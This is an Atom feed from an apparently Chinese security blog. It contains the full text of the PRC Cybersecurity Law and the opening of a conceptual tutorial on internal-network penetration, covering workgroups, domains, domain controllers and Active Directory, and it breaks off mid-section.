<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XYZ</title>
  
  <subtitle>XYZ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xyzsec.cn/"/>
  <updated>2021-10-17T09:58:42.744Z</updated>
  <id>https://xyzsec.cn/</id>
  
  <author>
    <name>XYZ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://xyzsec.cn/2021/10/17/zhong-hua-ren-min-gong-he-guo-wang-luo-an-quan-fa/"/>
    <id>https://xyzsec.cn/2021/10/17/zhong-hua-ren-min-gong-he-guo-wang-luo-an-quan-fa/</id>
    <published>2021-10-17T09:58:42.667Z</published>
    <updated>2021-10-17T09:58:42.744Z</updated>
    
    <content type="html"><![CDATA[<p>title: 中华人民共和国网络安全法<br>top: false<br>cover: false<br>toc: true<br>mathjax: true<br>date: 2021-08-08 09:30:25<br>password:<br>summary:<br>tags:</p><ul><li>categories:</li></ul><h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章　总　则"></a><strong>第一章　总　则</strong></h2><p>　　第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>　　第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>　　第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>　　第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>　　第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>　　第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>　　第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>　　第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>　　县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>　　第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>　　第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>　　第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>　　第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>　　任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>　　第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>　　第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>　　有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h2 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章　网络安全支持与促进"></a>第二章　网络安全支持与促进</h2><p>　　第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>　　国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>　　第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>　　第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>　　第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>　　国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>　　第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>　　大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>　　第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h2 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章　网络运行安全"></a><strong>第三章　网络运行安全</strong></h2><p>　　第一节　一般规定</p><p>　　第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>　　（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>　　（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>　　（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>　　（四）采取数据分类、重要数据备份和加密等措施；</p><p>　　（五）法律、行政法规规定的其他义务。</p><p>　　第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>　　网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>　　网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>　　第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>　　第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>　　国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>　　第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>　　第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>　　第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>　　第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>　　第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>　　有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>　　第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>　　第二节　关键信息基础设施的运行安全</p><p>　　第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>　　国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>　　第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>　　第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>　　第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>　　（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>　　（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>　　（三）对重要系统和数据库进行容灾备份；</p><p>　　（四）制定网络安全事件应急预案，并定期进行演练；</p><p>　　（五）法律、行政法规规定的其他义务。</p><p>　　第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>　　第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>　　第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>　　第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>　　第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>　　（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>　　（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>　　（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>　　（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h2 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章　网络信息安全"></a><strong>第四章　网络信息安全</strong></h2><p>　　第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>　　第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>　　网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>　　第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>　　网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>　　第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>　　第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>　　第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>　　第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>　　第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>　　第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>　　电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>　　第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>　　网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>　　第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h2 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章　监测预警与应急处置"></a><strong>第五章　监测预警与应急处置</strong></h2><p>　　第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>　　第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>　　第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>　　负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>　　网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>　　第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>　　（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>　　（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>　　（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>　　第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>　　第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>　　第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>　　第五十八条　因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章　法律责任"></a><strong>第六章　法律责任</strong></h2><p>　　第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>　　关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>　　第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>　　（一）设置恶意程序的；</p><p>　　（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>　　（三）擅自终止为其产品、服务提供安全维护的。</p><p>　　第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>　　第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>　　单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>　　违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>　　第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>　　违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>　　第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>　　单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>　　第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>　　第六十九条　网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>　　（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>　　（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>　　（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>　　第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>　　第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>　　第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>　　第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>　　网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>　　第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>　　违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>　　第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章　附　则"></a><strong>第七章　附　则</strong></h2><p>　　第七十六条　本法下列用语的含义：</p><p>　　（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>　　（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>　　（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>　　（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>　　（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>　　第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>　　第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>　　第七十九条　本法自2017年6月1日起施行。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;title: 中华人民共和国网络安全法&lt;br&gt;top: false&lt;br&gt;cover: false&lt;br&gt;toc: true&lt;br&gt;mathjax: true&lt;br&gt;date: 2021-08-08 09:30:25&lt;br&gt;password:&lt;br&gt;summary:&lt;br&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内网渗透基础及环境搭建</title>
    <link href="https://xyzsec.cn/2021/09/21/nei-wang-shen-tou-ji-chu-ji-huan-jing-da-jian/"/>
    <id>https://xyzsec.cn/2021/09/21/nei-wang-shen-tou-ji-chu-ji-huan-jing-da-jian/</id>
    <published>2021-09-21T10:24:02.000Z</published>
    <updated>2021-10-27T07:20:52.665Z</updated>
    
    <content type="html"><![CDATA[<blockquote></blockquote><h1 id="一-内网渗透基础"><a href="#一-内网渗透基础" class="headerlink" title="一:内网渗透基础"></a>一:内网渗透基础</h1><blockquote><p>内网也是指计算机网络中根据地理范围划分中的局域网(Local Area Network)，即<code>内网等同于局域网</code>  。</p><p>内网渗透又叫做后渗透，区别于前渗透的WEB渗透，内网渗透是指从获取WEB服务器的shell之后到拿下内网全部主机的过程叫做内网渗透。</p></blockquote><ul><li><p>什么是计算机网络？</p><p>计算机网络是将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接，在网络操作系统，网络管理软件及网络通信协议管理和协调下，实现资源共享和信息传递的计算机系统。</p></li></ul><h3 id="1-工作组"><a href="#1-工作组" class="headerlink" title="1:工作组"></a>1:工作组</h3><blockquote><p>工作组（Work Group）：将不同的计算机按照功能或部门分别列入到不同的工作组中。</p></blockquote><ul><li>默认工作组：<code>WORKGROUP</code></li><li>加入工作组时，如果名称不存在就相当于新建了一个工作组</li><li>工作组没有集中管理的作用，在工作组里的所有计算机都是平等的没有服务器和客户机之分</li></ul><p><img src="https://s3.ax1x.com/2021/03/19/6RxnfI.png" alt></p><h3 id="2-域"><a href="#2-域" class="headerlink" title="2:域"></a>2:域</h3><blockquote><p>需求:希望某台计算机的账户可以访问每台计算机的资源或者在每台计算机上进行登录！</p></blockquote><ul><li><code>域</code>:(Domain)是一个有安全边界的计算机集合。（安全边界：在两个域环境中一个域的用户无法访问另一个域中的资源）</li><li><code>域</code>:与工作组相比，域的安全管理控制机制更加严格。</li><li><code>域控制器</code>:(Domain Controller,DC)是域中的一台类似于管理服务器的计算机，类似于单位的门禁系统，负责所有连入的计算机和用户的验证工作。</li><li><code>域控制器</code>:存在由这个域的账户.密码.属于这个域的计算机等信息构成的数据库–&gt;<code>活动目录</code>。</li><li><code>域控制器</code>:是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行；简单来说域内所有用来验证身份的账号和密码散列值都保存在域控制器当中–&gt;<code>活动目录</code>。</li></ul><h4 id="2-1域环境分类"><a href="#2-1域环境分类" class="headerlink" title="2.1域环境分类"></a>2.1域环境分类</h4><ol><li><p><code>单域</code>：一个有安全边界的计算机集合，单域内至少两台域服务器，一台作为DC另一台作为备份DC，活动目录的数据库(域用户/计算机/网络设备)是存储在AD中的，没有备份AD一旦瘫痪，域内其他用户就不能登录该域。</p></li><li><p><code>父域子域</code>：第一个域称为父域，各分部的域称为该域名的子域。</p><p>例1：把不同地点的分公司放在同一个域内，那么主机之间的信息交互花费时间就比较长，占用宽带就比较大。</p><p>例2：公司某部门希望使用特定的安全策略(账号密码策略)，就可以将部门作为子域来单独管理。</p></li><li><p><code>域树</code>：多个域通过建立信任关系组成的集合。</p><ul><li>两个域之间相互访问，需要建立信任关系；</li><li>在一个域树种，父域可以包含多个子域；</li><li>一个.代表一个层次，放在最后的子域称之为一级域，前面的子域称之为二级域；</li><li>子域只能使用父域的名字作为其域名的后缀；</li></ul><p><img src="https://z3.ax1x.com/2021/03/23/673R4x.png" alt></p></li><li><p><code>域森林</code>：多个域树通过建立信任关系组成的集合。</p><p><img src="https://z3.ax1x.com/2021/03/23/673oKe.png" alt></p></li><li><p><code>域名服务器</code>:DNS(Domain Name Server)是指用于实现域名和IP地址解析的服务器，分为正向解析与反向解析。</p><ul><li>正向解析：域名–&gt;IP地址</li><li>反向解析：IP地址–&gt;域名</li><li>域内计算机使用DNS来定位域控制器/服务器/其他计算机，所以域名==&gt;DNS域的名字</li><li><strong>在内网渗透中，通过寻找DNS服务器来确定域控制器的位置</strong>：DNS服务器和域控制器通常配置在同一台机器上！！！</li></ul></li></ol><h3 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3:活动目录"></a>3:活动目录</h3><blockquote><p>Active Directory(AD)是指域环境中提供目录服务的组件，目录用于存储有关网络对象(用户/组/计算机/共享资源/打印机/联系人)的信息。</p></blockquote><h4 id="3-1活动目录功能"><a href="#3-1活动目录功能" class="headerlink" title="3.1活动目录功能"></a>3.1活动目录功能</h4><ul><li>账号集中管理：所有账号存储在服务器中，以便执行命令和重置密码；</li><li>软件集中管理：统一推送软件(软件安装)，安装网络打印机(硬件设备)；</li><li>环境集中管理：统一客户端界面(统一桌面不知)/IE(安全性策略)/…等设置；</li><li>增强安全性：统一部署杀毒软件和病毒扫描任务/集中管理用户的计算机权限/统一制定用户密码策略等；</li><li>更可靠，更短的宕机时间：利用活动目录控制用户方位权限</li><li><strong>活动目录是微软提供的统一管理平台，ISA/Exchange/SMS等都依赖这个平台</strong></li></ul><h3 id="4-域控和活动目录区别"><a href="#4-域控和活动目录区别" class="headerlink" 